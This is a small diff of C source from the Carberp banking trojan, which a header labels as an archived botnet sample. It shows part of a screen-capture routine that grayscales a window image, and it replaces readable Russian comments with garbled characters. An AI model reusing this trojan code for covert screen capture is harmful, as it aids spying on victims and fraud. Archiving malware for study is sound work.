@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "util.h"
 #include "image.h"
 #include "ScreenShot.h"
@@ -59,8 +70,8 @@ ScreenShot* MakeScreenShot(HWND hWnd)
 	ret->height = info.bmiHeader.biHeight;
 	ret->bits = 8;
 	unsigned char* to = ret->image;
-	//переводим в черно белое
-	int lenRow = (ret->width * 3 + 3) & ~3; //количество байт должно быть кратно 4
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	int lenRow = (ret->width * 3 + 3) & ~3; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 4
 	for( int i = ret->height - 1; i >= 0; i-- )
 	{
 		unsigned char* p = mem + i * lenRow;
